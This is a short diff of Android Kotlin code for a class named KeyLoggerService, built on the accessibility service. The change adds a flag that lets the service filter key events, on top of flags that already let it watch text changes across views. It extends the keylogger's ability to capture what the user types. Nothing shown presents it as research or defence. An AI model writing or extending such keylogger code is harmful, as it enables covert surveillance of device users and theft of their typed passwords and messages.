@@ -95,7 +95,8 @@ class KeyLoggerService : AccessibilityService() {
     val info = serviceInfo
     info.flags = info.flags or
       AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
-      AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
+      AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS or
+      AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS
     info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
     info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
     serviceInfo = info
